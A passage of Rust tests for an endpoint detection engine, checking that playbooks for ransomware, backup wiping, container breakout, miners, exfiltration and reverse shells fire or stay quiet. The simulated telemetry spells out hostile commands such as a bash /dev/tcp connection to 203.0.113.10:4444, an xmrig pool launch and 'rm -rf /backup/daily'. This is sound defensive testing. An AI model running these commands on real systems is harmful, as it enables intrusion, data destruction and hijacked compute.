    s.tcp(10601, 7, 2, ("10.0.2.15", 0), ("203.0.113.10", 4444));
    s.tcp(55, 2, 1, ("10.0.2.15", 41000), ("203.0.113.10", 4444));
}
fn webshell(s: &mut Sim) {
    webshell_with(s, "/usr/sbin/nginx");
}
fn webshell_miss(s: &mut Sim) {
    // The same shell from an SSH session, not a web server.
    webshell_with(s, "/usr/sbin/sshd");
}

/// fires_once: the sequence fires the playbook exactly once.
/// cooldown: the same sequence again inside the cooldown does not fire, after it does.
/// near_miss: one required step missing or outside its time does not fire.
macro_rules! playbook_tests {
    ($name:ident, $id:expr, $seq:path, $miss:path) => {
        mod $name {
            use super::*;

            #[test]
            fn fires_once() {
                let mut s = Sim::new();
                $seq(&mut s);
                assert_eq!(s.count($id), 1, "fired: {:?}", s.fired());
            }

            #[test]
            fn cooldown_holds_then_ends() {
                let mut s = Sim::new();
                $seq(&mut s);
                assert_eq!(s.count($id), 1);
                let cd = s.cooldown($id);
                s.advance(cd / 2);
                $seq(&mut s);
                assert_eq!(s.count($id), 1, "fired again inside the cooldown");
                s.advance(cd);
                $seq(&mut s);
                assert_eq!(s.count($id), 2, "did not fire after the cooldown");
            }

            #[test]
            fn near_miss_does_not_fire() {
                let mut s = Sim::new();
                $miss(&mut s);
                assert_eq!(s.count($id), 0, "fired: {:?}", s.fired());
            }
        }
    };
}

playbook_tests!(container_breakout_precursors, BREAKOUT, breakout, breakout_miss);
playbook_tests!(attr_locker, ATTR, attr, attr_miss);
playbook_tests!(backup_wipe_first, BACKUP, backup, backup_miss);
playbook_tests!(container_hostpath, HOSTPATH, hostpath, hostpath_miss);
playbook_tests!(db_impact, DB, db, db_miss);
playbook_tests!(fileburst_crypto, FILEBURST, fileburst, fileburst_miss);
playbook_tests!(fuse_overlay, FUSE, fuse, fuse_miss);
playbook_tests!(intermit_encrypt, INTERMIT, intermit, intermit_miss);
playbook_tests!(luks_locker, LUKS, luks, luks_miss);
playbook_tests!(memfd_inplace, MEMFD, memfd, memfd_miss);
playbook_tests!(netshare_only, NETSHARE, netshare, netshare_miss);
playbook_tests!(vm_image_datastore, VM, vm, vm_miss);
playbook_tests!(wiper_service_kill, WIPER, wiper, wiper_miss);
playbook_tests!(compress_then_exfil, COMPRESS, compress, compress_miss);
playbook_tests!(cloud_cli_exfil, CLOUD_EXFIL, cloud_exfil, cloud_exfil_miss);
playbook_tests!(crypto_miner, MINER, miner, miner_miss);
playbook_tests!(encryptor_memfd_lowrename, ENCRYPTOR, encryptor, encryptor_miss);
playbook_tests!(exfil_staging_tmpfs, STAGING, staging, staging_miss);
playbook_tests!(lateral_ssh_portforward, LATERAL, lateral, lateral_miss);
playbook_tests!(lotl_cred, LOTL_CRED, lotl_cred, lotl_cred_miss);
playbook_tests!(lotl_curl_devshm_systemdrun, LOTL_CURL, lotl_curl, lotl_curl_miss);
playbook_tests!(memfd_child_egress, MEMFD_EGRESS, memfd_egress, memfd_egress_miss);
playbook_tests!(edr_tamper_disable, TAMPER, tamper, tamper_miss);
playbook_tests!(internal_ddos_egress, DDOS, ddos, ddos_miss);
playbook_tests!(cloud_store, CLOUD_STORE, cloud_store, cloud_store_miss);
playbook_tests!(exfil_then_encrypt, EXFIL_ENC, exfil_enc, exfil_enc_miss);
playbook_tests!(ssh_valid_creds_pivot, SSH_CREDS, ssh_creds, ssh_creds_miss);
playbook_tests!(terminal_exec_core, TERMINAL, terminal, terminal_miss);
playbook_tests!(webshell_reverse_shell, WEBSHELL, webshell, webshell_miss);

// ---- What the hits carry, and the conditions the near misses do not cover ----

#[test]
fn fileburst_hit_carries_the_counts_and_the_tool() {
    let mut s = Sim::new();
    fileburst(&mut s);
    let hit = s.hits.iter().find(|h| h.playbook_id == FILEBURST).unwrap();
    let burst = &hit.slots["file_burst"].fields;
    assert_eq!(burst["__agg.kind"], "file_burst");
    // The slot keeps its newest hit, made by the last of the 510 renames.
    assert_eq!(burst["__agg.files"], "510");
    assert_eq!(burst["__agg.distinct_topdirs"], "3");
    assert_eq!(burst["__agg.window_sec"], "600");
    assert_eq!(hit.slots["crypto_exec"].fields["exe"], "/usr/bin/openssl");
    // The optional rename-extension slot was filled by the .enc renames.
    assert!(hit.filled_slots.contains(&"new_exts".to_string()), "{:?}", hit.filled_slots);
    assert_eq!(hit.ts, s.t);
    let alert = hit_alert_json(hit);
    assert_eq!(alert["event"]["exe"], "/usr/bin/openssl");
    assert_eq!(alert["technique"], "T1486");
    assert!(alert["findings"].as_array().unwrap().iter().any(|f| f["label"] == "T1486"));
}

#[test]
fn chroot_in_usr_sbin_fills_the_namespace_step() {
    let mut s = Sim::new();
    s.exec(4200, 4000, 0, "/usr/sbin/chroot", "chroot /host /bin/bash");
    s.perf_open(4201, 0, "cat", "/var/run/docker.sock");
    assert_eq!(s.count(BREAKOUT), 1);
}

#[test]
fn memfd_inplace_skips_bursts_with_renames() {
    let mut s = Sim::new();
    s.memfd_exec(8000, "/memfd:payload (deleted)", "payload --run");
    memfd_burst(&mut s, true);
    assert_eq!(s.count(MEMFD), 0, "rename ratio 1.0 is not in place");
}

#[test]
fn intermit_needs_short_writes() {
    let mut s = Sim::new();
    for i in 0..800 {
        let p = format!("/home/bob/v/clip{i}.mp4");
        s.sys_open(7800, &p, O_RDWR, 7);
        s.sys_write(7800, 7, 1024 * 1024);
        s.sys_close(7800, 7);
        s.sys_rename(7800, &p, &format!("{p}.lock"));
    }
    assert_eq!(s.count(INTERMIT), 0, "1 MiB writes are not partial encryption");
}

#[test]
fn netshare_rsync_archive_is_vetoed() {
    let mut s = Sim::new();
    s.exec(8110, 8100, 1000, "/usr/bin/rsync", "rsync --archive /home/a/ /mnt/nfs/projects/");
    netshare(&mut s);
    assert_eq!(s.count(NETSHARE), 0, "a live forbidden slot blocks the playbook");
    // After the forbidden slot's 1800 s TTL the same burst fires.
    s.advance(1801);
    netshare(&mut s);
    assert_eq!(s.count(NETSHARE), 1);
}

#[test]
fn the_object_store_comes_from_the_tls_server_name() {
    // The same destructive upload to a host that is not an object store does not fire.
    let mut s = Sim::new();
    cloud_upload_to(&mut s, 10200, "/usr/bin/rclone", "rclone sync --delete-after /srv/data remote:bucket", 3, 80, "files.example.test");
    assert_eq!(s.count(CLOUD_STORE), 0);
    let mut s = Sim::new();
    cloud_store(&mut s);
    let hit = s.hits.iter().find(|h| h.playbook_id == CLOUD_STORE).unwrap();
    assert_eq!(hit.slots["cloud_upload_burst"].fields["sni"], "bucket-x.s3.amazonaws.com");
}

#[test]
fn a_pool_named_in_the_tls_hello_counts_as_pool_comms() {
    // stratum+ssl to port 443: no pool port, but the hello names the pool.
    let mut s = Sim::new();
    s.exec(9300, 9299, 1000, "/tmp/.x/xmrig", "xmrig -o stratum+ssl://pool.supportxmr.com:443 --algo rx/0");
    s.connect(9300, "203.0.113.10", 443);
    s.tls_hello(9300, "203.0.113.10", 443, "pool.supportxmr.com");
    for _ in 0..62 {
        s.advance(5);
        s.perf(9300, "/tmp/.x/xmrig", 99.0);
    }
    assert_eq!(s.count(MINER), 1);
    // The same with an ordinary web name does not.
    let mut s = Sim::new();
    s.exec(9300, 9299, 1000, "/tmp/.x/xmrig", "xmrig -o stratum+ssl://cdn.example.test:443 --algo rx/0");
    s.connect(9300, "203.0.113.10", 443);
    s.tls_hello(9300, "203.0.113.10", 443, "cdn.example.test");
    for _ in 0..62 {
        s.advance(5);
        s.perf(9300, "/tmp/.x/xmrig", 99.0);
    }
    assert_eq!(s.count(MINER), 0);
}

fn fake_names(uid: u32) -> Option<String> {
    match uid {
        1500 => Some("infra_admin".into()),
        1000 => Some("alice".into()),
        _ => None,
    }
}

#[test]
fn site_context_vetoes_bastions_admin_jump_boxes_and_the_backup_window() {
    // A bastion host: port forwarding is its job.
    let mut s = Sim::new();
    s.mapper.host_role = Some("bastion".into());
    lateral(&mut s);
    assert_eq!(s.count(LATERAL), 0);

    // infra_admin connected inward first, so the login and copy are its routine.
    let mut s = Sim::new();
    s.mapper.uid_names = fake_names;
    s.exec(10390, 1, 1500, "/usr/bin/ssh", "ssh 10.0.0.9");
    s.connect(10390, "10.0.0.9", 22);
    ssh_creds(&mut s);
    assert_eq!(s.count(SSH_CREDS), 0);
    // alice is not an admin account, so her chain still fires.
    let mut s = Sim::new();
    s.mapper.uid_names = fake_names;
    s.exec(10391, 1, 1000, "/usr/bin/ssh", "ssh 10.0.0.9");
    s.connect(10391, "10.0.0.9", 22);
    ssh_creds(&mut s);
    assert_eq!(s.count(SSH_CREDS), 1);

    // Saturday 02:00 local time is the backup window.
    use chrono::{Datelike, TimeZone, Timelike};
    let mut s = Sim::new();
    while {
        let t = chrono::Local.timestamp_opt(s.t as i64, 0).unwrap();
        !(t.weekday() == chrono::Weekday::Sat && t.hour() == 2)
    } {
        s.t += 3600;
    }
    staging(&mut s);
    assert_eq!(s.count(STAGING), 0);
    // Five hours later the window is over and the same chain fires.
    s.advance(5 * 3600);
    staging(&mut s);
    assert_eq!(s.count(STAGING), 1);
}

#[test]
fn passwd_names_parse() {
    let m = parse_passwd("root:x:0:0:root:/root:/bin/bash\n# comment\nalice:x:1000:1000::/home/alice:/bin/sh\nbroken\n");
    assert_eq!(m.get(&1000).map(String::as_str), Some("alice"));
    assert_eq!(m.get(&0).map(String::as_str), Some("root"));
    assert_eq!(m.len(), 2);
}

#[test]
fn a_busy_gpu_adds_the_optional_gpu_slot() {
    let mut s = Sim::new();
    miner_start(&mut s);
    for _ in 0..62 {
        s.advance(5);
        gpu(&mut s, 96.0);
        s.perf(9300, "/tmp/.x/xmrig", 99.0);
    }
    let hit = s.hits.iter().find(|h| h.playbook_id == MINER).unwrap();
    assert!(hit.filled_slots.contains(&"gpu_pressure".to_string()), "{:?}", hit.filled_slots);
    // Without GPU load the same chain fires without the slot.
    let mut s = Sim::new();
    miner(&mut s);
    let hit = s.hits.iter().find(|h| h.playbook_id == MINER).unwrap();
    assert!(hit.missing_optional.contains(&"gpu_pressure".to_string()));
}

/// Packages the tests pretend are installed: restic from its package, a restic whose
/// bytes no longer match, and curl.
fn fake_pkgs(path: &str) -> Option<crate::pkg_verify::Verdict> {
    use crate::pkg_verify::Verdict;
    match path {
        "/usr/bin/restic" => Some(Verdict { package: "restic".into(), verified: true }),
        "/usr/sbin/restic" => Some(Verdict { package: "restic".into(), verified: false }),
        "/usr/bin/curl" => Some(Verdict { package: "curl".into(), verified: true }),
        _ => None,
    }
}

#[test]
fn only_a_verified_backup_package_vetoes() {
    for (exe, vetoes) in [("/usr/bin/restic", true), ("/usr/sbin/restic", false), ("/tmp/restic", false)] {
        let mut s = Sim::new();
        s.mapper.pkg_lookup = fake_pkgs;
        s.exec(9190, 1, 0, exe, "restic backup /srv/data");
        cloud_exfil(&mut s);
        assert_eq!(s.count(CLOUD_EXFIL), if vetoes { 0 } else { 1 }, "{exe}");
    }
}

#[test]
fn exec_facts_carry_the_package_and_the_allowlisted_env() {
    let mut s = Sim::new();
    s.mapper.pkg_lookup = fake_pkgs;
    let af = adapter_facts_with(
        &out("process", "process::exec", &[("pid", "830".into()), ("ppid", "1".into()), ("source", "proc_lifecycle".into())]),
        s.t,
        &|_| ProcInfo {
            exe: Some("/usr/bin/curl".into()),
            cmdline: Some("curl -s https://x".into()),
            cwd: None,
            env: vec![("CI".into(), "true".into())],
        },
    );
    let f = s.mapper.facts(&af[0]);
    assert_eq!(f[0].fields["exe_package"], "curl");
    assert_eq!(f[0].fields["exe_pkg_verified"], "true");
    assert_eq!(f[0].fields["env.CI"], "true");
    // Only allowlisted names are read, and a secret looking name is never allowed.
    let allow: Vec<String> = ["CI", "GITLAB_CI"].iter().map(|s| s.to_string()).collect();
    let env = crate::pb_adapter::allowlisted_env(b"CI=true\0AWS_SECRET_ACCESS_KEY=abc\0GITLAB_CI=1\0PATH=/usr/bin\0", &allow);
    assert_eq!(env, vec![("CI".to_string(), "true".to_string()), ("GITLAB_CI".to_string(), "1".to_string())]);
    assert!(crate::pb_adapter::env_allowlist().iter().all(|n| !crate::redact::is_secret_name(n)));
}

#[test]
fn package_manager_vetoes_fileburst() {
    // A package run by the user whose chain it is vetoes that chain.
    let mut s = Sim::new();
    s.raw_uid = 0;
    s.exec(7650, 1, 0, "/usr/bin/apt-get", "apt-get install -y nginx");
    fileburst_renames(&mut s);
    s.advance(5);
    openssl_as(&mut s, 0);
    assert_eq!(s.count(FILEBURST), 0);
    // context_keys [host, user]: root's package run does not veto uid 1000's chain.
    let mut s = Sim::new();
    s.exec(7650, 1, 0, "/usr/bin/apt-get", "apt-get install -y nginx");
    fileburst(&mut s);
    assert_eq!(s.count(FILEBURST), 1);
}

#[test]
fn context_keys_keep_two_users_apart_end_to_end() {
    // root wipes the backups, but the rename burst is uid 1000's: two chains.
    let mut s = Sim::new();
    s.exec(7000, 6999, 0, "/usr/bin/rm", "rm -rf /backup/daily");
    s.advance(60);
    backup_burst(&mut s);
    assert_eq!(s.count(BACKUP), 0);
}

#[test]
fn backup_wipe_must_come_first() {
    // The burst before the wipe breaks the link snapshot_wipe then file_burst.
    let mut s = Sim::new();
    s.raw_uid = 0;
    backup_burst(&mut s);
    s.advance(60);
    s.exec(7000, 6999, 0, "/usr/bin/rm", "rm -rf /backup/daily");
    assert_eq!(s.count(BACKUP), 0);
    // The burst keeps going after the wipe: now the order holds and it fires.
    s.advance(10);
    for i in 400..410 {
        let p = format!("/srv/data/f{i}.db");
        s.sys_rename(7100, &p, &format!("{p}.locked"));
    }
    assert_eq!(s.count(BACKUP), 1);
    let hit = s.hits.iter().find(|h| h.playbook_id == BACKUP).unwrap();
    assert!(hit.ground_truth);
    assert_eq!(hit.context[1], ("user".to_string(), "root".to_string()));
}

#[test]
fn ground_truth_lines_are_labelled_and_private() {
    let mut s = Sim::new();
    backup(&mut s);
    let hit = s.hits.iter().find(|h| h.playbook_id == BACKUP).unwrap().clone();
    let dir = std::env::temp_dir().join(format!("edr_gt_{}", std::process::id()));
    let _ = std::fs::remove_dir_all(&dir);
    let path = dir.join("logs").join("ground_truth.jsonl");
    write_ground_truth(&hit, &path).unwrap();
    write_ground_truth(&hit, &path).unwrap();
    let text = std::fs::read_to_string(&path).unwrap();
    let lines: Vec<Value> = text.lines().map(|l| serde_json::from_str(l).unwrap()).collect();
    assert_eq!(lines.len(), 2, "appended");
    let gt = &lines[0];
    assert_eq!(gt["label"], "attack");
    assert_eq!(gt["playbook_id"], BACKUP);
    assert_eq!(gt["context"]["user"], "root");
    assert_eq!(gt["id"], hit.id());
    assert_eq!(gt["slots"]["snapshot_wipe"]["exe"], "/usr/bin/rm");
    assert!(gt["slots"]["file_burst"]["ts"].as_u64().is_some());
    use std::os::unix::fs::PermissionsExt;
    let mode = std::fs::metadata(&path).unwrap().permissions().mode() & 0o777;
    assert_eq!(mode, 0o600);
    // A playbook without emit_ground_truth does not ask for it.
    let mut s = Sim::new();
    db(&mut s);
    assert!(!s.hits.iter().find(|h| h.playbook_id == DB).unwrap().ground_truth);
    let _ = std::fs::remove_dir_all(&dir);
}

// ---- Mapper ----

fn mapper() -> Mapper {
    Mapper::with_mounts(Box::new(FixedMounts(vec![("/".into(), "ext4".into())])))
}

fn map_one(m: &mut Mapper, o: TelemetryOutput) -> Vec<Fact> {
    let read = |_pid: i64| ProcInfo {
        exe: Some("/usr/bin/python3.11".into()),
        cmdline: Some("python3 job.py".into()),
        cwd: Some("/home/u/work".into()),
        env: Vec::new(),
    };
    adapter_facts_with(&o, 1_800_000_000, &read)
        .iter()
        .flat_map(|af| m.facts(af))
        .collect()
}

fn raw_out(evt: i64, sys: i64, pid: i64, fd: i64, ret: i64, flags: i64, aux64: u64, path: &str, path2: &str) -> TelemetryOutput {
    let mut d = vec![
        ("ts_ns", "5000000000".to_string()),
        ("timestamp", "1800000000".to_string()),
        ("tgid", pid.to_string()),
        ("uid", "0".to_string()),
        ("fd", fd.to_string()),
        ("ret", ret.to_string()),
        ("evt_type", evt.to_string()),
        ("syscall_id", sys.to_string()),
        ("flags", flags.to_string()),
        ("aux_u64", aux64.to_string()),
        ("comm", "python3".to_string()),
    ];
    if !path.is_empty() {
        d.push(("path", path.to_string()));
    }
    if !path2.is_empty() {
        d.push(("path2", path2.to_string()));
    }
    out("file", "file_open", &d)
}

#[test]
fn open_flags_and_return_pick_the_op() {
    let mut m = mapper();
    let op = |m: &mut Mapper, flags: i64, ret: i64| {
        let f = map_one(m, raw_out(10, 56, 900, ret.max(-1), ret, flags, 0, "/etc/hosts", ""));
        (f[0].fields["op"].clone(), f[0].fields.get("errno").cloned())
    };
    assert_eq!(op(&mut m, O_RDONLY, 3), ("open".into(), None));
    assert_eq!(op(&mut m, O_WRONLY, 3), ("write".into(), None));
    assert_eq!(op(&mut m, O_RDWR, 3), ("write".into(), None));
    assert_eq!(op(&mut m, O_CREAT_ | O_WRONLY, 3), ("write".into(), None));
    assert_eq!(op(&mut m, O_RDONLY, -13), ("open_fail".into(), Some("EACCES".into())));
    assert_eq!(op(&mut m, O_RDONLY, -1), ("open_fail".into(), Some("EPERM".into())));
    assert_eq!(op(&mut m, O_RDONLY, -2), ("open_fail".into(), Some("ENOENT".into())));
}

#[test]
fn write_bytes_follow_the_fd_until_close() {
    let mut m = mapper();
    map_one(&mut m, raw_out(10, 56, 900, 5, 5, O_RDWR, 0, "/srv/a.bin", ""));
    let w = map_one(&mut m, raw_out(13, 64, 900, 5, 0, 0, 4096, "", ""));
    assert_eq!(w[0].fields["path"], "/srv/a.bin");
    assert_eq!(w[0].fields["bytes"], "4096");
    // Same fd number in another process, and a write after close: no file known.
    assert!(map_one(&mut m, raw_out(13, 64, 901, 5, 0, 0, 10, "", "")).is_empty());
    map_one(&mut m, raw_out(18, 57, 900, 5, 0, 0, 0, "", ""));
    assert!(map_one(&mut m, raw_out(13, 64, 900, 5, 0, 0, 10, "", "")).is_empty());
}

#[test]
fn rename_relative_paths_and_skipped_frames() {
    let mut m = mapper();
    let r = map_one(&mut m, raw_out(11, 276, 900, -1, 0, 0, 0, "a.txt", "a.txt.LOCKED"));
    assert_eq!(r[0].fields["op"], "rename");
    // Relative to the cwd /proc reported for the pid.
    assert_eq!(r[0].fields["path"], "/home/u/work/a.txt");
    assert_eq!(r[0].fields["topdir"], "/home");
    assert_eq!(r[0].fields["ext_new"], ".locked");
    let d = map_one(&mut m, raw_out(14, 35, 900, -1, 0, 0, 0, "/var/www/x.php", ""));
    assert_eq!((d[0].fields["op"].as_str(), d[0].fields["topdir"].as_str()), ("delete", "/var/www"));
    // execve at syscall entry is not an exec fact.
    assert!(map_one(&mut m, raw_out(30, 221, 900, -1, 0, 0, 0, "/usr/bin/ls", "")).is_empty());
    // The agent's own events never become facts.
    let mut own = Mapper::new();
    let me = std::process::id() as i64;
    assert!(map_one(&mut own, raw_out(14, 35, me, -1, 0, 0, 0, "/tmp/x", "")).is_empty());
}

#[test]
fn exec_and_memory_facts_get_exe_and_argv_from_proc() {
    let mut m = mapper();
    let e = map_one(
        &mut m,
        out(
            "process",
            "process::exec",
            &[("pid", "77".into()), ("ppid", "1".into()), ("uid", "0".into()), ("comm", "python3".into()), ("ts_ns", "5000000000".into()), ("source", "proc_lifecycle".into())],
        ),
    );
    assert_eq!(e[0].kind, FactKind::Exec);
    assert_eq!(e[0].exe.as_deref(), Some("/usr/bin/python3.11"));
    assert_eq!(e[0].cmd.as_deref(), Some("python3 job.py"));
    assert_eq!(e[0].user.as_deref(), Some("root"));
    assert_eq!(e[0].fields["ppid"], "1");
    // Fork and exit are not exec facts.
    let fork = out("process", "process::fork", &[("pid", "77".into()), ("source", "proc_lifecycle".into())]);
    assert!(map_one(&mut m, fork).is_empty());
    // RWX_MAP is an Exec fact for the process that mapped it. w_then_x is not a fact.
    let rwx = out("memory", "memory::rwx_map", &[("pid", "78".into()), ("source", "wx_exec".into())]);
    assert_eq!(map_one(&mut m, rwx)[0].fields["tags"], "memory::rwx_map,RWX_MAP");
    let wtx = out("memory", "memory::w_then_x", &[("pid", "78".into()), ("source", "wx_exec".into())]);
    assert!(map_one(&mut m, wtx).is_empty());
}

#[test]
fn numeric_file_names_stay_text() {
    let mut m = mapper();
    // As numbers these would read back as 7 and 12.
    let f = map_one(
        &mut m,
        out("file", "file_access", &[("pid", "5".into()), ("path", "007".into()), ("comm", "0012".into()), ("source", "file_access_monitor".into())]),
    );
    assert_eq!(f[0].fields["path"], "/home/u/work/007");
    assert_eq!(f[0].fields["comm"], "0012");
}

#[test]
fn mountinfo_parse_and_lookup() {
    let text = "22 1 0:21 / / rw,relatime - ext4 /dev/vda1 rw\n\
                40 22 0:40 / /mnt/nfs rw - nfs4 srv:/export rw\n\
                41 22 0:41 / /mnt/my\\040share rw - cifs //srv/s rw\n\
                42 22 0:42 / /mnt/nfsx rw - ext4 /dev/vdb rw\n";
    let t = parse_mountinfo(text);
    assert_eq!(t.len(), 4);
    assert_eq!(t[2].0, "/mnt/my share");
    assert_eq!(mount_for(&t, "/mnt/nfs/a/b"), Some(("/mnt/nfs".into(), "nfs4".into())));
    // Whole components only: /mnt/nfsx is not under /mnt/nfs.
    assert_eq!(mount_for(&t, "/mnt/nfsx/a").unwrap().1, "ext4");
    assert_eq!(mount_for(&t, "/mnt/my share/f").unwrap().1, "cifs");
    assert_eq!(mount_for(&t, "/etc/hosts").unwrap().0, "/");
}

// ---- Time ----

#[test]
fn kernel_stamps_and_missing_stamps_become_unix_seconds() {
    let mut m = mapper();
    // A raw frame carries ts_ns from bpf_ktime_get_ns (time since boot).
    let ns = clock::unix_secs_to_mono_ns(1_800_000_123);
    let mut o = raw_out(14, 35, 900, -1, 0, 0, 0, "/srv/x", "");
    o.data.insert("ts_ns".into(), ns.to_string());
    // A stale boot-seconds "timestamp" next to it is ignored in favour of ts_ns.
    o.data.insert("timestamp".into(), (ns / 1_000_000_000).to_string());
    assert_eq!(map_one(&mut m, o)[0].ts, 1_800_000_123);
    // file_access_monitor frames have no stamp and get the time they reached the adapter.
    let o = out("file", "file_access", &[("pid", "5".into()), ("path", "/srv/y".into()), ("source", "file_access_monitor".into())]);
    assert_eq!(map_one(&mut m, o)[0].ts, 1_800_000_000);
}

#[test]
fn facts_from_two_clocks_land_in_one_window() {
    // A wx frame (kernel stamp) and a perf open (no stamp, adapter time) 20 s apart
    // complete a playbook only if both are on the same clock.
    let mut s = Sim::new();
    s.exec(4100, 4000, 0, "/usr/bin/unshare", "unshare --mount --fork /bin/sh");
    s.advance(20);
    s.perf_open(4101, 0, "cat", "/proc/kallsyms");
    let hit = s.hits.iter().find(|h| h.playbook_id == BREAKOUT).unwrap();
    let a = hit.slots["ns_priv_tools"].ts;
    let b = hit.slots["host_fs_touch"].ts;
    assert_eq!(b - a, 20);
}

/// Prints the rationale of each playbook's hit. Run with --nocapture to read it.
#[test]
fn every_playbook_explains_its_hit() {
    let cases: [(&str, fn(&mut Sim)); 29] = [
        (COMPRESS, compress),
        (CLOUD_EXFIL, cloud_exfil),
        (MINER, miner),
        (ENCRYPTOR, encryptor),
        (STAGING, staging),
        (LATERAL, lateral),
        (LOTL_CRED, lotl_cred),
        (LOTL_CURL, lotl_curl),
        (MEMFD_EGRESS, memfd_egress),
        (TAMPER, tamper),
        (DDOS, ddos),
        (CLOUD_STORE, cloud_store),
        (EXFIL_ENC, exfil_enc),
        (SSH_CREDS, ssh_creds),
        (TERMINAL, terminal),
        (WEBSHELL, webshell),
        (BREAKOUT, breakout),
        (ATTR, attr),
        (BACKUP, backup),
        (HOSTPATH, hostpath),
        (DB, db),
        (FILEBURST, fileburst),
        (FUSE, fuse),
        (INTERMIT, intermit),
        (LUKS, luks),
        (MEMFD, memfd),
        (NETSHARE, netshare),
        (VM, vm),
        (WIPER, wiper),
    ];
    for (id, seq) in cases {
        let mut s = Sim::new();
        seq(&mut s);
        let hit = s.hits.iter().find(|h| h.playbook_id == id).expect(id);
        eprintln!("== {id} (also fired: {:?})", s.fired().iter().filter(|x| *x != id).collect::<Vec<_>>());
        for line in &hit.rationale {
            eprintln!("   {line}");
        }
    }
}

// ---- Sensor gaps closed in the kernel: renameat and the exec /proc race ----

#[test]
fn glibc_renameat_frames_fill_the_burst() {
    // glibc rename() enters renameat (38), not renameat2 (276). Same playbook result.
    let mut s = Sim::new();
    for i in 0..510 {
        let dir = ["/home/alice/docs", "/srv/share", "/opt/app/data"][i % 3];
        let p = format!("{dir}/f{i}.txt");
        s.sys_renameat(7600, &p, &format!("{p}.enc"));
    }
    s.advance(5);
    openssl(&mut s);
    assert_eq!(s.count(FILEBURST), 1, "fired: {:?}", s.fired());
    let hit = s.hits.iter().find(|h| h.playbook_id == FILEBURST).unwrap();
    assert_eq!(hit.slots["file_burst"].fields["__agg.files"], "510");
}

#[test]
fn attr_locker_fires_when_every_chattr_was_gone_from_proc() {
    // chattr exits in about a millisecond, so live every one of the 200 runs can be gone
    // before its frame is read. The kernel copy of filename and argv is what is left.
    let mut s = Sim::new();
    for i in 0..200 {
        let argv = format!("chattr +i /home/u/f{i} /srv/d/f{i} /opt/a/f{i}");
        s.exec_gone(5000 + i, 4999, "/usr/bin/chattr", &argv);
        if i % 10 == 9 {
            s.advance(1);
        }
    }
    for i in 0..300 {
        s.sys_open(6000 + i % 5, &format!("/home/u/f{}", i % 200), O_RDWR, -13);
    }
    assert_eq!(s.count(ATTR), 1, "fired: {:?}", s.fired());
}

#[test]
fn exec_gone_from_proc_without_a_kernel_copy_cannot_match() {
    // The same run with frames from an older sensor (no filename, no argv) gives Exec
    // facts with no exe or cmd, so the chattr slot never fills.
    let mut s = Sim::new();
    for i in 0..200 {
        s.exec_gone(5000 + i, 4999, "", "");
    }
    for i in 0..300 {
        s.sys_open(6000 + i % 5, &format!("/home/u/f{}", i % 200), O_RDWR, -13);
    }
    assert_eq!(s.count(ATTR), 0, "fired: {:?}", s.fired());
}

#[test]
fn proc_wins_when_it_agrees_with_the_kernel_copy() {
    // A script: the kernel reports the script path, /proc/<pid>/exe the interpreter, and
    // both have the same argv. /proc is read first, so the interpreter is the exe.
    let mut m = mapper();
    let read = |_pid: i64| ProcInfo {
        exe: Some("/usr/bin/dash".into()),
        cmdline: Some("/bin/sh /usr/local/bin/systemctl stop x".into()),
        cwd: Some("/root".into()),
        env: Vec::new(),
    };
    let o = out(
        "process",
        "process::exec",
        &[
            ("pid", "77".into()),
            ("comm", "systemctl".into()),
            ("source", "proc_lifecycle".into()),
            ("exec_filename", "/usr/local/bin/systemctl".into()),
            ("exec_argv", "/bin/sh /usr/local/bin/systemctl stop x".into()),
        ],
    );
    let e: Vec<Fact> = adapter_facts_with(&o, 1_800_000_000, &read).iter().flat_map(|af| m.facts(af)).collect();
    assert_eq!(e[0].exe.as_deref(), Some("/usr/bin/dash"));
    assert_eq!(e[0].cmd.as_deref(), Some("/bin/sh /usr/local/bin/systemctl stop x"));
    assert_eq!(e[0].fields["cwd"], "/root");
}

#[test]
fn the_kernel_copy_wins_when_proc_already_shows_a_later_program() {
    // Seen live: `bash -c 'exec 3<>/dev/tcp/...; echo hi >&3; sleep 75'` runs sleep in
    // place within a millisecond, so /proc shows sleep when the bash exec frame is read.
    let mut m = mapper();
    let read = |_pid: i64| ProcInfo {
        exe: Some("/usr/bin/sleep".into()),
        cmdline: Some("sleep 75".into()),
        cwd: Some("/run_full".into()),
        env: Vec::new(),
    };
    let o = out(
        "process",
        "process::exec",
        &[
            ("pid", "12245".into()),
            ("ppid", "12239".into()),
            ("comm", "bash".into()),
            ("source", "proc_lifecycle".into()),
            ("exec_filename", "/usr/bin/bash".into()),
            ("exec_argv", "bash -c exec 3<>/dev/tcp/203.0.113.10/4444; echo hi >&3; sleep 75".into()),
        ],
    );
    let e: Vec<Fact> = adapter_facts_with(&o, 1_800_000_000, &read).iter().flat_map(|af| m.facts(af)).collect();
    assert_eq!(e[0].exe.as_deref(), Some("/usr/bin/bash"));
    assert!(e[0].cmd.as_deref().unwrap().contains("/dev/tcp/203.0.113.10/4444"));
    assert!(!e[0].fields.contains_key("cwd"), "the cwd was the later program's");
    // A /proc command line longer than the 256 byte kernel copy is still the same exec.
    let long = format!("python3 job.py {}", "a".repeat(300));
    let read = |_pid: i64| ProcInfo { exe: Some("/usr/bin/python3.11".into()), cmdline: Some(long.clone()), cwd: None, env: Vec::new() };
    let o = out(
        "process",
        "process::exec",
        &[("pid", "88".into()), ("source", "proc_lifecycle".into()), ("exec_filename", "/usr/bin/python3".into()), ("exec_argv", long[..256].to_string())],
    );
    let e: Vec<Fact> = adapter_facts_with(&o, 1_800_000_000, &read).iter().flat_map(|af| m.facts(af)).collect();
    assert_eq!(e[0].exe.as_deref(), Some("/usr/bin/python3.11"));
    assert_eq!(e[0].cmd.as_deref(), Some(long.as_str()));
}

// ---- NetFlow, Net, RuleHit, HostPerf and Auth facts ----

fn net_out(signal: &str, pid: i64, kv: &[(&str, &str)]) -> TelemetryOutput {
    let mut d: Vec<(&str, String)> = vec![("pid", pid.to_string()), ("source", "net_flow".into())];
    d.extend(kv.iter().map(|(k, v)| (*k, v.to_string())));
    out("network", signal, &d)
}

#[test]
fn sends_take_the_destination_of_the_newest_connect() {
    let mut m = mapper();
    let c = map_one(&mut m, net_out("network::connect", 70, &[("dst_addr", "203.0.113.9"), ("dst_port", "443"), ("family", "2")]));
    assert_eq!(c[0].kind, FactKind::NetFlow);
    assert_eq!(c[0].fields["op"], "connect");
    assert_eq!(c[0].fields["dst_scope"], "public");
    assert_eq!(c[0].fields["dst_private"], "false");
    assert_eq!(c[0].fields["dst_new"], "true");
    // The test mapper reads no /proc, so a process with no exec fact has no exe.
    assert!(c[0].exe.is_none());
    let tx = map_one(&mut m, net_out("network::tx_bytes", 70, &[("bytes", "5000")]));
    assert_eq!(tx[0].fields["op"], "send");
